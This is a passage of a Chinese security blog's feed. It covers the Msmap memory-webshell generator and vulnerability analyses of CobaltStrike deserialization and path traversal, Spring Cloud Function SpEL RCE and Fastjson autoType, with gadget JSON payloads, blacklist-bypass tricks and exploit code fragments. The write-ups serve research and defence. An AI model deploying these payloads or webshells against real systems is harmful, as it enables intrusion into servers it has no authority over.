    <content type="html"><![CDATA[<p>在太阳系以太阳为中心，可以用较为简洁的数学公式拟合出周围行星的运动规律，牛顿定律解释不了时就升级为广义相对论（比如水星近日点进动）。Msmap经过三天三次更新迭代，兼容了三个常用WebShell管理客户端，适配的过程修正了一些解藕不充分的问题。</p><p>对于俗称的WebShell连接密码，蚁剑用来从请求参数中取数据，冰蝎用作解密请求体数据的密钥，哥斯拉则拆分为了<code>Password</code>和<code>Key</code>，<code>Password</code>取数据、<code>Key</code>用作密钥。为了生成体验不割裂，设计上让蚁剑的密码哈希作为密钥，冰蝎密码从哈希改为明文，哥斯拉的<code>Password</code>和<code>Key</code>用同一个值。这应该并没有降级工具在原本设计上的安全性，冰蝎密码是在客户端取的哈希、哥斯拉回显时密钥也是确定的，也就是说这些机制并不是为防止骑马设计的，主要是对抗纯流量审查，严防骑马害得上RSA。但这是内存马，相对来说更难看到类属性值。</p><blockquote><p>要支持哥斯拉自定义<code>Key</code>也好改，生成设置Password时用逗号分隔拆分一下就行了，只是目前感觉不是很必要</p></blockquote><p>关于执行体，蚁剑是传入<code>response</code>对象内部处理输出，冰蝎是将<code>response</code>对象封装进Map传入内部处理输出，哥斯拉是传入用来接收执行结果的对象，在内存马中自定义处理输出。关于回显编码/加密器，蚁剑和冰蝎是跟着流量走的，哥斯拉是写在内存马中自定义处理的，所以Stub代码片段中会多一个Base64编码函数。</p><p>可以看出哥斯拉在这块耦合度更低，且在第一次流量类初始化后保存对象，后续只用发出简短的指令而非完整类字节码。我有点一根筋，不想因为一个Stub要存对象，就往所有组件类里新增属性，所以复用了注入时的线程锁对象，让被冷落的小可怜活了回来。</p><p>还有一点结构性调整是，感觉冰蝎没有回显界定符和抢占输出，如果访问路径本身有内容输出的话，会干扰到冰蝎拿回显结果。同时也是为了兼容WsFilter及各个<code>stub</code>，将原本在<code>hook</code>中处理的回显输出部分改放到了<code>stub</code>中。</p><p>这个兼容的过程，似乎也与用更精准的数学公式去拟合物理规律 异曲同工（技术没啥长进，倒是越来越会胡说八道了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在太阳系以太阳为中心，可以用较为简洁的数学公式拟合出周围行星的运动规律，牛顿定律解释不了时就升级为广义相对论（比如水星近日点进动）。Msmap经过三天三次更新迭代，兼容了三个常用WebShell管理客户端，适配的过程修正了一些解藕不充分的问题。&lt;/p&gt;
&lt;p&gt;对于俗称的We</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="WebShell" scheme="https://hosch3n.github.io/tags/WebShell/"/>
    
    <category term="AntSword" scheme="https://hosch3n.github.io/tags/AntSword/"/>
    
    <category term="Behinder" scheme="https://hosch3n.github.io/tags/Behinder/"/>
    
    <category term="Godzilla" scheme="https://hosch3n.github.io/tags/Godzilla/"/>
    
  </entry>
  
  <entry>
    <title>Msmap内存马生成框架（一）</title>
    <link href="https://hosch3n.github.io/2022/08/08/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://hosch3n.github.io/2022/08/08/Msmap%E5%86%85%E5%AD%98%E9%A9%AC%E7%94%9F%E6%88%90%E6%A1%86%E6%9E%B6%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2022-08-08T08:37:10.000Z</published>
    <updated>2022-08-09T03:36:17.888Z</updated>
    
    <content type="html"><![CDATA[<p>一直想要把这部分的知识沉淀一下，最近看到井喷式的新内存马后有了一些小想法，所以整了这么个烂活，作为工具的同时也是一个知识框架。如果能方便大家那就更开心了，不好用也欢迎来issue里喷俺，只是喷完要对人家负责（doge，提出建设性建议</p><hr><p>先拉一面大旗，<del>从钱老的总体设计部可以看出顶层设计的重要性</del>，抱歉调子起高了</p><p><img src="/img/msmapa_a.jpg"></p><p>内存马就是在容器本身的执行流程上，额外加上自己的操作逻辑。比如有个自动化工厂门没锁，我们溜进去，给流水线加一个专门贴狗头的机器，就是利用漏洞打内存马的过程。工厂就象征着Web应用服务器。</p><p>这个狗头机器是加在流水线开头、中间还是结尾，就对应着内存马打到Web应用服务器的不同组件里，流水线一般就是一次网络请求。</p><p>不同工厂的门有圆的有方的有菱形，所以我们的机器为了能偷运进去，就需要适配成不同的外形，但不论外形怎么变，它最终还是一台狗头机器。也就是说内存马要注入进不同的Web应用服务器，需要封装适配成不同的类，但最终还是用于执行某个操作。</p><p>我们要是想机器不止能贴狗头，而是能根据指示来决定贴上狗头、猫猫、嘤嘤鹰。<strong>外形什么的都不用变</strong>，只要升级一下贴纸模块。又或者某些安保好一点的工厂，说猫猫狗狗贴纸不得入内，我们就可以给机器加上一个二维码识别模块，运二维码进去机器内再解码成猫猫狗狗躲避安检。</p><p>贴纸模块就对应着执行体（比如执行系统命令、执行蚁剑客户端流量等），二维码模块就对应着解码器，而二维码生成器就是WebShell客户端的流量加密/编码函数。</p><p>各模块间能相互兼容，平滑替换为别的模块，在软件工程中叫做解藕。msmap做的事就是解藕组件类、编码器与执行体，把内存马这个大任务，拆分成拿context、注入组件、流量解密、代码执行等小目标。这么干除了方便自由组合外，也可以让新技术（Tomcat迟早要被师傅们插成TomShell）更快地应用在实战上。</p><blockquote><p>同理客户端payload不依赖request等对象，解藕出功能执行部分，提供一个接口让外部自己解决输入输出，单论兼容性方面也会更好一点点</p></blockquote><p>胡说八道完了，扯点踏实点的东西。用Python写主要是相对熟悉一些，但是命令行用着终究还是不太方便，不知道用Qt写GUI怎么样。目前这个选择菜单为了支持回退还费了点心思，本来用了另一种方式实现栈但是太别扭了。马子兼容性方面从beichen大佬的代码里偷师学到了用动态代理兼容<code>javax</code>与<code>jakarta</code>的办法，各种方法和类全部用反射，所以编译时不用依赖Tomcat的API了，但目前WsFilter还没调通所以这个还没能安排上自动编译。。。加载Killer本来准备兼容打包一下，后来想起yzddMr6大佬已经集成进了插件，我也就没必要再画蛇添足了。</p><p>最后希望自己能慢慢完善工具，让它支持更多容器组件，也算是作为逐渐成长的一种见证，与各位师傅共勉！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;一直想要把这部分的知识沉淀一下，最近看到井喷式的新内存马后有了一些小想法，所以整了这么个烂活，作为工具的同时也是一个知识框架。如果能方便大家那就更开心了，不好用也欢迎来issue里喷俺，只是喷完要对人家负责（doge，提出建设性建议&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;先拉一面大旗，&lt;</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="WebShell" scheme="https://hosch3n.github.io/tags/WebShell/"/>
    
    <category term="AntSword" scheme="https://hosch3n.github.io/tags/AntSword/"/>
    
    <category term="Tomcat" scheme="https://hosch3n.github.io/tags/Tomcat/"/>
    
    <category term="Killer" scheme="https://hosch3n.github.io/tags/Killer/"/>
    
  </entry>
  
  <entry>
    <title>某C2鸡肋漏洞分析</title>
    <link href="https://hosch3n.github.io/2022/05/12/%E6%9F%90C2%E9%B8%A1%E8%82%8B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2022/05/12/%E6%9F%90C2%E9%B8%A1%E8%82%8B%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-05-12T05:08:44.000Z</published>
    <updated>2023-01-12T05:55:13.710Z</updated>
    
    <content type="html"><![CDATA[<p>CobaltStrike是一个知名的红队命令与控制框架，采用<code>Beacon &lt;-&gt; TeamServer &lt;-&gt; Client</code>架构。TeamServer存在受限路径穿越写文件与反序列化漏洞，可以被认证后客户端恶意利用。Client存在反序列化漏洞，可以被RogueCS攻击。</p><h2 id="山寨威胁建模"><a href="#山寨威胁建模" class="headerlink" title="山寨威胁建模"></a>山寨威胁建模</h2><p>由于这个软件的特殊性，我们需要想想什么才是漏洞：</p><ol><li><p>直接攻击TeamServer暴露的服务</p></li><li><p>通过Beacon攻击TeamServer</p></li><li><p>通过Client攻击TeamServer</p></li><li><p>通过TeamServer攻击Client</p></li></ol><ul><li>TeamServer控制Beacon是功能，任何所谓TeamServer攻击Beacon的操作都不能算漏洞</li></ul><p>可以看出TeamServer是核心，先从它下手。</p><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><ul><li><a href="https://research.nccgroup.com/2020/06/15/striking-back-at-retired-cobalt-strike-a-look-at-a-legacy-vulnerability/">in-the-wild</a></li></ul><p>利用TeamServer从Beacon下载文件时，会将Beacon可控数据中的IP字段作为目录的特点，实现路径穿越写计划任务RCE。</p><ul><li><a href="https://www.sentinelone.com/labs/hotcobalt-new-cobalt-strike-dos-vulnerability-that-lets-you-halt-operations/">CVE-2021-36798</a></li></ul><p>利用TeamServer从Beacon加载截图和键盘记录时，会根据Beacon可控数据中的字节大小申请内存的特点，实现内存耗尽DoS。</p><ul><li><a href="https://download.cobaltstrike.com/releasenotes.txt">CVE-2022-23317</a></li></ul><p>猜测是为了兼容<code>proxy</code>的功能（路径为<code>http://</code>开头），没有对URL路径做严谨的校验。动态调试可以看出这会绕过profile相关配置，直接拿到公钥等数据：</p><p><img src="/img/mc2ldfx_a.png"></p><h2 id="虚假的DoS"><a href="#虚假的DoS" class="headerlink" title="虚假的DoS"></a>虚假的DoS</h2><p><code>BeaconC2.process_beacon_data</code>中存在一处利用条件比较苛刻的DoS。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">int</span> var4 = var3.readInt();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (var4 &gt; var3.available()) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">byte</span>[] var5 = <span class="keyword">new</span> <span class="keyword">byte</span>[var4];</span><br></pre></td></tr></table></figure><h2 id="受限路径穿越"><a href="#受限路径穿越" class="headerlink" title="受限路径穿越"></a>受限路径穿越</h2><p><img src="/img/mc2ldfx_b.png"></p><p>用来防止路径穿越的核心是<code>CommonUtils.SafeFile</code>方法，判断解析前后的路径是否还以限定前缀开头。这其实可以让我们向上穿越一级并得到前缀开头的文件对象：</p><p><img src="/img/mc2ldfx_c.png"></p><ul><li><a href="https://securitylab.github.com/advisories/GHSL-2022-008_The_OWASP_Enterprise_Security_API/">CVE-2022-23457</a>就是另一个例子</li></ul><p>以<code>ManageUser.process</code>为例，Client可以通过<code>Host File</code>功能上传文件到TeamServer并映射至Web服务，这会先发出一个<code>armitage.upload</code>进行预处理，随后由<code>armitage.append</code>上传文件数据。</p><p><img src="/img/mc2ldfx_d.png"></p><p>这里Client与TeamServer基于序列化通过socket通信，<code>SafeFile</code>的二参<code>var1.arg(0)</code>客户端可控，在<code>UploadFile.result</code>拼接上前缀就可以实现受限路径穿越写文件。<del>然而这并没有什么卵用</del></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.conn.call(<span class="string">&quot;armitage.append&quot;</span>, CommonUtils.args(<span class="keyword">this</span>.file.getName()</span><br><span class="line">|</span><br><span class="line">V</span><br><span class="line"><span class="keyword">this</span>.conn.call(<span class="string">&quot;armitage.append&quot;</span>, CommonUtils.args(<span class="string">&quot;../uploads&quot;</span>+<span class="keyword">this</span>.file.getName()</span><br></pre></td></tr></table></figure><p><img src="/img/mc2ldfx_e.png"></p><p>想到zip解压释放软链接那种套路，File确实可以透过软链接写入指向文件中，但这里似乎没法实现直接将用于路径穿越的软链接本身存进去。</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><img src="/img/mc2ldfx_f.png"></p><p>反序列化核心是<code>TeamSocket.readObject</code>方法，实际使用的<code>ObjectInputStream.readUnshared</code>。它在<code>ManageUser.run</code>中被<code>PostAuthentication.clientAuthenticated</code>通过多线程拉起。</p><p><img src="/img/mc2ldfx_g.png"></p><p><code>client</code>来自<code>SecureServerSocket.acceptAndAuthenticate</code>中接收的客户端数据，预检密码使用<code>readUnsignedByte</code>读入，在密码比对正确时会进入上述反序列化流程。</p><p><img src="/img/mc2ldfx_h.png"></p><p>在客户端<code>Connect.dialogAction</code>发起连接时可以向TeamServer传输序列化对象，如果服务端存在gadgets环境就可被恶意利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.tqueue.call(<span class="string">&quot;aggressor.authenticate&quot;</span>, CommonUtils.args(var3, var6, Aggressor.VERSION), <span class="keyword">this</span>);</span><br><span class="line">|</span><br><span class="line">V</span><br><span class="line">Object payload = getObject() <span class="comment">// URLDNS, 7u21, ...</span></span><br><span class="line"><span class="keyword">this</span>.tqueue.call(<span class="string">&quot;aggressor.authenticate&quot;</span>, CommonUtils.args(var3, var6, payload), <span class="keyword">this</span>)</span><br></pre></td></tr></table></figure><ul><li>看代码流程感觉作者是考虑到了的，所以将反序列化放到了认证后</li></ul><p>随后<code>ManageUser.process</code>会将登录成功/失败的消息序列化写回客户端，我们可以把<code>SecureServerSocket.authenticate</code>改为任何密码都校验成功（欺骗客户端通过密码预检），再写回恶意序列化对象（成为RogueCS），如果客户端存在gadgets环境就可被利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>.authenticated &amp;&amp; <span class="string">&quot;aggressor.authenticate&quot;</span>.equals(var1.getCall()) &amp;&amp; var1.size() == <span class="number">3</span>) &#123;</span><br><span class="line">...</span><br><span class="line">    Object payload = getObject() <span class="comment">// URLDNS, 7u21, ...</span></span><br><span class="line">    <span class="keyword">this</span>.client.writeObject(var1.reply(payload))</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>Client攻击TeamServer的话，需要知道服务端的密码（比如通过泄漏/反制得到HOME目录下<code>.aggressor.prop</code>配置文件），而通过TeamServer则可以攻击任何前来连接的Client。</p><p>危害大小取决于运行环境中gadgets的能力，我目前还没在CS内置的lib中找到有实质危害的gadgets。对于原生JRE环境而言，可以通过<code>DeserializationBomb</code>造成CPU型DoS：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Set&lt;Object&gt; root = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">Set&lt;Object&gt; s1 = root;</span><br><span class="line">Set&lt;Object&gt; s2 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++) &#123;</span><br><span class="line">    Set&lt;Object&gt; t1 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    Set&lt;Object&gt; t2 = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">    t1.add(<span class="string">&quot;foo&quot;</span>); <span class="comment">// make it not equal to t2</span></span><br><span class="line">    s1.add(t1);</span><br><span class="line">    s1.add(t2);</span><br><span class="line">    s2.add(t1);</span><br><span class="line">    s2.add(t2);</span><br><span class="line">    s1 = t1;</span><br><span class="line">    s2 = t2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/mc2ldfx_i.png"></p><p>这个与之前OpenSSL的DoS效果类似，多核环境只会影响单核。相关上下文大都是局部变量，也不太可能通过反序列化造成内存型DoS。所以一般也就能打个DNS自嗨，但如果以前调试漏洞在<code>jre/lib/ext</code>之类的目录引入过危险依赖，或者有大聪明用了7u21就会导致RCE：</p><p><img src="/img/mc2ldfx_j.png"></p><p>CS内置了<code>commons-io</code>、<code>sleep</code>等jar包，找到链也不是完全没有可能，或者找到一种可控方式从当前目录加载类，就能结合受限路径穿越变成RCE。万一山鸡变凤凰了呢（doge</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;CobaltStrike是一个知名的红队命令与控制框架，采用&lt;code&gt;Beacon &amp;lt;-&amp;gt; TeamServer &amp;lt;-&amp;gt; Client&lt;/code&gt;架构。TeamServer存在受限路径穿越写文件与反序列化漏洞，可以被认证后客户端恶意利用。Clie</summary>
      
    
    
    
    <category term="基础设施" scheme="https://hosch3n.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD/"/>
    
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
    <category term="CNVD-2022-45437" scheme="https://hosch3n.github.io/tags/CNVD-2022-45437/"/>
    
    <category term="Traversal" scheme="https://hosch3n.github.io/tags/Traversal/"/>
    
    <category term="DoS" scheme="https://hosch3n.github.io/tags/DoS/"/>
    
  </entry>
  
  <entry>
    <title>SpringCloudFunction漏洞分析</title>
    <link href="https://hosch3n.github.io/2022/03/26/SpringCloudFunction%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hosch3n.github.io/2022/03/26/SpringCloudFunction%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-03-25T18:14:51.000Z</published>
    <updated>2022-04-07T08:50:39.861Z</updated>
    
    <content type="html"><![CDATA[<p>SpringCloudFunction是一个SpringBoot开发的Servless中间件（FAAS），支持基于SpEL的函数式动态路由。在特定配置下，3 &lt;= 版本 &lt;= 3.2.2（<code>commit dc5128b</code>之前）存在SpEL表达式执行导致的RCE。</p><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><p>在<code>main</code>分支<a href="https://github.com/spring-cloud/spring-cloud-function/commit/dc5128b80c6c04232a081458f637c81a64fa9b52">commit dc5128b</a>中，新增了<code>SimpleEvaluationContext</code>：</p><p><img src="/img/scfspel_a.png"></p><p>由<code>isViaHeader</code>变量作为flag，在解析前判断<code>spring.cloud.function.routing-expression</code>的值是不是取自HTTP头，如果是的话就用<code>SimpleEvaluationContext</code>解析SpEL语句，不是来自外部输入时（比如<code>System.setProperty</code>）才用<code>StandardEvaluationContext</code>解析。</p><p><img src="/img/scfspel_b.png"></p><p>同样的，官方测试用例已经清楚地写明了漏洞位置与Payload：</p><p><img src="/img/scfspel_c.png"></p><p>提取出测试类后在apply方法下断并跟入，省略一些中间流程，最终可以看到从HTTP头<code>spring.cloud.function.routing-expression</code>中取出SpEL表达式并由<code>StandardEvaluationContext</code>解析：</p><p><img src="/img/scfspel_d.png"></p><p>至此source与sink已经清晰，虽然测试用例可以模拟触发漏洞，但还是要搭出一套能实际复现的环境。刚开始时想不开，自己在那啃文档碎碎写了一两个小时demo硬是搭不起来，后来发现<a href="https://github.com/spring-cloud/spring-cloud-function/tree/main/spring-cloud-function-samples/function-sample-pojo">官方提供的sample</a>就很好用Orz：</p><p><img src="/img/scfspel_e.png"></p><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>好消息是只有Spring Cloud Function部分版本<del>特定配置的动态路由才会受影响（<code>spring.cloud.function.definition=functionRouter</code>）</del>，坏消息是SpEL表达式存在charset、replace等多种变形。</p><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p><a href="https://twitter.com/phithon_xg/status/1511760497179193346">https://twitter.com/phithon_xg/status/1511760497179193346</a></p><p><img src="/img/scfspel_f.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.spring.io/spring-cloud-function/docs/3.2.2/reference/html/spring-cloud-function.html#_function_routing_and_filtering">Function Routing and Filtering</a></p><p><a href="https://stackoverflow.com/questions/63389412/vanilla-spring-cloud-function-with-routing">Vanilla Spring Cloud Function with Routing</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;SpringCloudFunction是一个SpringBoot开发的Servless中间件（FAAS），支持基于SpEL的函数式动态路由。在特定配置下，3 &amp;lt;= 版本 &amp;lt;= 3.2.2（&lt;code&gt;commit dc5128b&lt;/code&gt;之前）存在SpEL表</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="servless" scheme="https://hosch3n.github.io/tags/servless/"/>
    
    <category term="CVE-2022-22963" scheme="https://hosch3n.github.io/tags/CVE-2022-22963/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson-autoType漏洞总结</title>
    <link href="https://hosch3n.github.io/2022/03/24/Fastjson-autoType%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://hosch3n.github.io/2022/03/24/Fastjson-autoType%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2022-03-24T09:38:23.000Z</published>
    <updated>2022-05-12T03:37:27.171Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to convert a JSON string to an equivalent Java object. Fastjson can work with arbitrary Java objects including pre-existing objects that you do not have source-code of.</p></blockquote><p>可以由<code>JSON.toJSONString(object)</code>将对象序列化为json字符串，由<code>JSON.parseObject/parseArray</code>或<code>JSON.parse</code>从json字符串中反序列化还原为对象。在序列化时指定开启<code>SerializerFeature.WriteClassName</code>功能，会在生成的json字段中加入<code>@type</code>用于指定具体类名，这样可以避免继承类被误反序列化为父类，从而丢失子类特有属性。</p><h2 id="1-2-24一般流程简述"><a href="#1-2-24一般流程简述" class="headerlink" title="1.2.24一般流程简述"></a>1.2.24一般流程简述</h2><p>根据方法与传参的不同，入口可能对应多个重载方法，但总体上与漏洞相关的逻辑大同小异：</p><ol><li><p>解析器初始化，调用解析方法</p></li><li><p>加载<code>@type</code>指定的类对象和与之对应的<code>Deserializer</code></p></li><li><p>如果类名在<code>denyList</code>中就抛出异常（黑名单）</p></li><li><p>如果是<code>JavaBeanDeserializer</code>，会通过内省获取方法和属性</p></li><li><p>获取到<code>defaultConstructor</code>则会进入第六步</p></li><li><p>将满足条件的setter与getter及相关属性，封装为<code>FieldInfo</code>类并加入<code>fieldList</code></p></li></ol><p><img src="/img/fastjsonsum_a.png"></p><p><img src="/img/fastjsonsum_b.png"></p><ol start="7"><li><p>将<code>Deserializer</code>缓存进<code>IdentityHashMap</code></p></li><li><p>获取各个属性对应的<code>FieldValueDeserilizer</code>，反序列化属性对象</p></li><li><p>由<code>setValue</code>根据属性类型，按照不同方式还原类对象属性</p></li></ol><p><img src="/img/fastjsonsum_c.png"></p><h3 id="调用getter"><a href="#调用getter" class="headerlink" title="调用getter"></a>调用getter</h3><p>第六步getter对于返回值类型要求比较严格，可以利用Fastjson一些特性扩大范围。</p><p>对于<code>JSON.parseObject(String text)</code>会先调用<code>parse</code>解析，如果返回类型不是<code>JSONObject</code>就通过<code>toJSON</code>转换:</p><p><img src="/img/fastjsonsum_i.png"></p><p>满足判断时可由<code>JSONSerializer.getObjectWriter</code>-&gt;<code>TypeUtils.buildBeanInfo</code>-&gt;<code>computeGetters</code>获取getter且无返回值类型限制。因为<code>JSONObject.toString</code>被重写成了<code>toJSONString</code>，只需构造形如<code>&#123;&#123;Gadgets&#125;:&quot;str&quot;&#125;</code>的结构即可触发。</p><p>此外对于JSON中<code>$ref</code>的值，会在<code>parse</code>完成后作为JSONPath解析，传入<code>$.valuea.valueb</code>可以链式触发<code>getValuea</code>和<code>getValueb</code>，这样就能调用到指定getter。</p><h3 id="指定还原类"><a href="#指定还原类" class="headerlink" title="指定还原类"></a>指定还原类</h3><p>当<code>parseObject</code>方法指定的还原类与JSON中<code>@type</code>指定的还原类不一致时，根据@香依香偎师傅的实验结果来看，如果两个类存在继承关系或是能由<code>toString</code>等方法转换，则通常可以正常反序列化并触发Payload；否则要具体情况具体分析。</p><h2 id="TemplatesImpl利用链"><a href="#TemplatesImpl利用链" class="headerlink" title="TemplatesImpl利用链"></a>TemplatesImpl利用链</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_bytecodes&quot;</span>:[<span class="string">&quot;BASE64&quot;</span>],</span><br><span class="line">  <span class="attr">&quot;_name&quot;</span>:<span class="string">&quot;any&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;_tfactory&quot;</span>:&#123;&#125;,</span><br><span class="line">  <span class="attr">&quot;_outputProperties&quot;</span>:&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>outputProperties</code>属性在<code>setValue</code>时，会调用<code>TemplatesImpl#getOutputProperties</code>，进而调用到<code>TransletClassLoader#defineClass</code>触发类加载。</p><p>Payload几个关键属性都是<code>private</code>且无相应setter/getter，因此反序列化时需要指定1.2.22版本引入的<code>Feature.SupportNonPublicField</code>：</p><p><img src="/img/fastjsonsum_d.png"></p><h2 id="JdbcRowSetImpl利用链"><a href="#JdbcRowSetImpl利用链" class="headerlink" title="JdbcRowSetImpl利用链"></a>JdbcRowSetImpl利用链</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;RogueJNDI&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>autoCommit</code>属性在<code>setValue</code>时，会调用<code>JdbcRowSetImpl#setAutoCommit</code>，进而调用到<code>InitialContext#lookup</code>触发JNDI注入。</p><h2 id="checkAutoType绕过"><a href="#checkAutoType绕过" class="headerlink" title="checkAutoType绕过"></a>checkAutoType绕过</h2><p>从1.2.25开始先进入<code>checkAutoType</code>检查，再调用<code>TypeUtils.loadClass</code>加载类。</p><h3 id="绕过黑名单"><a href="#绕过黑名单" class="headerlink" title="绕过黑名单"></a>绕过黑名单</h3><p>在手动开启<code>autoTypeSupport</code>时，会将类名与内置黑名单进行前缀匹配。利用<code>TypeUtils.loadClass</code>剔除<code>L</code>前缀和<code>;</code>后缀的特点，在原类名前后添加字符即可绕过内置黑名单的判断。</p><ul><li><code>L ClassName ;</code>、<code>[</code>分别是JVM的类、数组表示符</li></ul><p>1.2.42先剔除一次类名前后的<code>L</code>和<code>;</code>再进行黑名单判断，同时将黑名单从明文改为哈希形式，可以双写字符绕过。</p><p>1.2.43检查两次前缀，拦截<code>LL</code>开头的情况，可以构造<code>[ClassName[&#123;...</code>的数组形式，利用内部逻辑调用到<code>parseArray</code>实现绕过。</p><p>1.2.44增加了对<code>[</code>开头的检查，终结了已有黑名单绕过。如果存在某些依赖可以利用新链突破，后续更新也在继续完善黑名单。</p><h3 id="利用缓存机制"><a href="#利用缓存机制" class="headerlink" title="利用缓存机制"></a>利用缓存机制</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;GadgetsClassname&quot;&#125;:Gadgets</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以1.2.47为例，<code>java.lang.Class</code>对应的deserializer是<code>MiscCodec</code>，反序列化会解析JSON中<code>val</code>对应的值并生成对象，之后通过<code>TypeUtils.loadClass</code>加载<code>java.lang.Class</code>。loadClass方法的<code>cache</code>参数的缺省值为true，会将<code>val</code>值生成的对象存入<code>mappings</code>中。</p><p>下一轮<code>checkAutoType</code>时如果手动开启了<code>autoTypeSupport</code>，恶意类先黑名单匹配还是会被检测到，但只要在<code>mappings</code>缓存中匹配到了就不会抛出异常。之后无论<code>checkAutoType</code>是否开启，都能拿到缓存中的恶意类。</p><p><img src="/img/fastjsonsum_e.png"></p><p>要注意的是虽然1.2.25就加入了缓存机制，但1.2.33之前匹配黑名单就会抛出异常。1.2.48将<code>cache</code>缺省值改为false，新增了<code>Class.forName</code>前的判断，同时追加了黑名单以及对<code>expectClass</code>的检测。</p><h3 id="利用期望类"><a href="#利用期望类" class="headerlink" 